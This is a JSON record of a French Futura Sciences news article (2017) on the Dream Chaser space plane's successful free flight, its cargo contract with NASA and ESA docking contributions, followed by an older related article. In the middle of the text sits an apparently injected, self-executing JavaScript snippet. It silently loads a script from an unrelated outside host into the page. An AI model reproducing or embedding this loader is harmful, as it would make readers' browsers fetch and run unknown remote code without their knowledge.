{"title": "L'avion spatial Dream Chaser est de retour en vol", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "15/11/2017", "content": "Le Dream Chaser, l'avion spatial de Sierra Nevada, vient de réussir le vol libre de son programme de développement. Le premier, en 2013, s'était soldé par un crash. Dans trois ans, l'appareil devrait débuter son activité commerciale de transport de fret à destination de la Station spatiale internationale (ISS) pour le compte de la Nasa. Il y a quatre ans, le premier vol libre (c'est-à-dire sans moteur allumé) du Dream Chaser se soldait par un  crash  en raison d'un dysfonctionnement du train d'atterrissage avant. Aujourd'hui, l'avion spatial de Sierra Nevada est de nouveau en piste. Après un vol captif réalisé début septembre, pendant lequel il est resté une heure et demie dans les airs accroché à un hélicoptère, le Dream Chaser a en effet réalisé, ce 11 novembre, son premier vol libre avec succès. Au cours de ce vol, l'avion spatial a été transporté par hélicoptère jusqu'à une altitude de 3.750 mètres, d'où il a été relâché. Soixante secondes plus tard, l'appareil se posait, sans coup férir cette fois-ci, sur une des pistes de la base aérienne Edwards, en Californie (États-Unis), après avoir tout de même atteint une vitesse de 530 km/h. Cet essai n'était pas anodin. La trajectoire prise par l'appareil est celle attendue pour un retour de la  Station spatiale internationale  (ISS). L'essai a donc permis de vérifier cette phase critique de la mission ainsi que le comportement en vol du Dream Chaser et sa capacité à retourner sur Terre et à atterrir. Cette vidéo montre, en trois minutes, le vol libre du Dream Chaser réalisé le 11 novembre 2017. © Nasa, Sierra Nevada Un vol atmosphérique dès le prochain essai ? Bien que l'analyse des données recueillies pendant ce vol libre soit en cours, Mark Sirangelo, vice-président des systèmes spatiaux de Sierra Nevada, s'est dit très confiant : «  Dans l'ensemble, quels que soient les paramètres testés, tous les objectifs ont été,  soit  atteints, soit dépassés. Dans notre esprit, nous sommes très positifs à propos de ce test  ».  A priori , il n'y aura pas d'autre vol libre. Sierra Nevada souhaiterait réaliser un vol atmosphérique dès le prochain essai.  « La décision sera prise au cours des semaines prochaines sur la nécessité ou non d'un autre vol ». Le saviez-vous ? Depuis 2013, l’ Agence spatiale européenne  (ESA) s’intéresse aux deux versions du Dream Chaser : la version habitée et la version cargo. En ce qui concerne cette dernière, destinée au transport de fret, l'ESA va adapter deux contributions prévues pour la version habitée de cet avion spatial :  le mécanisme européen d'amarrage  IBDM  ( International Berthing and Docking Mechanism ) ; une suite logicielle dérivée du  programme ATV  pour l'amarrage automatique à l'ISS.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Initialement, d'autres vols planés étaient prévus, à des vitesses plus élevées et avec des pilotes à bord, mais seulement pour tester la  version habitée de cet avion spatial . Or, bien que Sierra Nevada n'ait pas abandonné ce projet, la société préfère se concentrer sur la version cargo, pour laquelle elle a remporté, en 2016, avec SpaceX et Orbital ATK, un  contrat de ravitaillement en fret  de l'ISS. Ce contrat prévoit un minimum de six vols à destination du complexe orbital, à réaliser entre fin 2019 et 2024. Pour Sierra Nevada, le premier vol à réaliser dans le cadre de ce contrat commercial est prévu en 2020. Il servira à la fois de vol d'essai orbital du véhicule et de première mission de transport de fret vers, et depuis, l'ISS. Pour en savoir plus L'avion spatial Dream Chaser réalisera son vol d'essai fin 2016 Article de Rémy Decourt publié le 27/01/2014 Sierra Nevada et United Launch Alliance ont signé le contrat de lancement du premier vol d'essai orbital du Dream Chaser, susceptible de transporter des  astronautes . Cet engin, plus proche d'un  planeur  que d'un avion, sera lancé par un lanceur  Atlas V  le 1er novembre 2016. L'état d'avancement du développement du  Dream Chaser  rend les responsables du programme optimistes. Malgré le  crash à l’atterrissage  d'un prototype d'essais techniques à l' automne  dernier, la société Sierra Nevada vient d'annoncer que le premier vol d'essai en  orbite , sans pilote, sera réalisé en novembre 2016. L'engin sera mis en orbite par une Atlas V d'United Launch Alliance, qui décollera du centre spatial de  Cap Canaveral , en Floride. Des trois sociétés en compétition pour la fourniture à la Nasa d'un service de transport à destination de la  Station spatiale internationale ,  Sierra Nevada  est la première à donner une date de lancement aussi précise. Certes, cela ne préfigure en rien des suites de la compétition, mais cette annonce intervient dans un contexte favorable au projet. La société privée a récemment conclu avec l' Agence spatiale européenne  un  partenariat non exclusif  qui pourrait se concrétiser par la fourniture du mécanisme européen d'amarrage IBDM ( International Berthing and Docking Mechanism ). Initialement développé pour le X-38, un démonstrateur qui devait préfigurer le véhicule de secours des équipages de la Station spatiale internationale (CRV,  Crew Return Vehicle ), ce mécanisme permettra au Dream Chaser de s'amarrer à la partie américaine de la Station spatiale. Vue d'artiste du Dream Chaser et de son lanceur Atlas V sur son pas de tir. Parmi les sociétés en compétition pour la fourniture à la Nasa d’un service de transport à destination de l’ISS, Sierra Nevada marque des points, avec un vol d’essai en orbite sans pilote annoncé pour novembre 2016. © Sierra Nevada                       La Nasa valide le concept du Dream Chaser Sierra Nevada a également franchi une nouvelle étape dans le développement de son engin. Courant janvier, la  Nasa  a passé en revue la manière dont Sierra Nevada comptait utiliser son système de transport, incluant le  lanceur  et l'étage Centaur, pour se rendre en sécurité à la Station Spatiale avec un équipage. Pour rappel, avant le mois d'août, moment où seront connus les deux projets qui continueront à recevoir les financements de la Nasa, chaque projet en compétition a un certain nombre d'étapes techniques à franchir. Préalablement définies et différentes d'un projet à un autre, elles conditionnent le versement par tranches du financement promis. Pour le Dream Chaser, elles sont au nombre de dix. À ce jour, Sierra Nevada en a franchi six. Quant au lanceur choisi, il s'agit d'une  Atlas V  d'United Launch Alliance. Cette  coentreprise  a été créée par Boeing et Lockheed Martin pour exploiter et commercialiser les lanceurs Atlas V et  Delta IV . Ce lanceur construit par Lockheed Martin est également celui qu'a choisi Boeing pour le lancement de sa  capsule CST-100 . Avec 42 missions et autant de succès, à l'exception du dixième tir partiellement réussi, ce lanceur est un des plus fiables du monde occidental. Il est également le seul lanceur occidental qualifié pour le lancement de charges nucléaires. ", "theme": "sciences"}